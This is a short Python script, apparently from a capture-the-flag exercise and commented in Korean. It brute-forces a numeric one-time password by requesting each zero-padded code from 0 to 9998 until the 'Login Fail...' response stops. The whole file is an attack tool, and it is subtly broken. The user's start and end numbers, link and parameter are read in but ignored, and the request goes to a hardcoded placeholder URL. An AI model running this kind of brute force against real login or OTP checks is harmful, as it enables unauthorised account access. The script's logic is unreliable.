import requests
# bruet - force

starNum = int(input("Starting Number is ? : "))
endNum = int(input("Starting Number is ? : "))
digits = len(str(endNum))

print("starting Number = " + str(starNum)+"\n"+ "Ending Number = " + str(endNum)+"\n" + "Digits:" + str(digits) +"\n")

print("type link ex :  ctf.segfaulthub.com:1129/6/checkOTP.php")
links = "http://"+ input("Link(without parameter): http://")

print("type parameter ex : optNum")
parameter = "?" + input("ParameterName : http://" +links + "?")+ "="

# 실제 크래킹 
print("[*] Password Crack Start....")
for i in range(0,9999):
    ## zfiill(숫자를 넣으면 됨)
    tryNum =str(i).zfill(digits)
    ## zfill/rjust 스트링 앞에 0 채우기 (총 숫자갯수 4개> 모라잔 str 만큼 0개가 채워짐 )
    print("[>] Try: :["+tryNum+"]", end="\r")
    ## 같은 자리 (1번쨰 줄에서만 출력)
    # 링크도 변경함 http://ctf.segfaulthub.com:1129/6/checkOTP.php? 에서 변경
    response = requests.get("http://ctf?otpNum=" + tryNum)
    if "Login Fail..." not in response.text:
        print("[+]Found Code : "+tryNum)
        break